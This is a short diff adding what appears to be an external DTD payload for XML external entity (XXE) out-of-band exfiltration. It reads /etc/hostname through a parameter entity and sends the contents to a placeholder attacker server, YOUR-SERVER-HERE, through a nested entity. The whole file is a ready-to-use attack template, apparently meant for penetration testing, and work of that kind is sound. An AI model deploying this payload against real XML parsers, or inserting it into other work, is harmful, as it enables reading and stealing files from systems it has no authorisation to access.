@@ -1,0 +1,6 @@
+# REPLACE YOUR-SERVER-HERE
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR-SERVER-HERE/?x=%file;'>">
+%eval;
+%exfiltrate;
